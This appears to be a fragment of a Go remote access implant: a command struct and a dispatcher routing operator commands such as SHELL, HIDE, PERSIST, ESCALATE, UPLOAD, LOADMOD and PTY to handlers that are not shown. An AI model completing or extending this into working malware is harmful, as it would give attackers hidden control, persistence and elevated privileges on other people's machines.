package main

import "encoding/json"

type Command struct {
	Op   string          `json:"op"`
	Arg  string          `json:"arg,omitempty"`
	Data json.RawMessage `json:"data,omitempty"`
}

func execute(cmd Command) any {
	switch cmd.Op {
	case "PING":
		return "PONG"
	case "STATUS":
		return handleStatusCmd()
	case "INFO":
		return handleInfoCmd()
	case "SHELL":
		return handleShellCmd(cmd.Arg)
	case "HIDE":
		return handleHideCmd(cmd.Arg)
	case "UNHIDE":
		return handleUnhideCmd(cmd.Arg)
	case "PERSIST":
		return handlePersistCmd()
	case "UNPERSIST":
		return handleUnpersistCmd()
	case "ESCALATE":
		return handleEscalateCmd(cmd.Arg)
	case "UPLOAD":
		return handleUploadCmd(cmd)
	case "LOADMOD":
		return handleLoadmodCmd(cmd)
	case "OPSEC":
		return handleOpsecCmd()
	case "PTY":
		return handlePTYCmd(cmd.Arg)
	default:
		return map[string]string{"error": "unknown command"}
	}
}
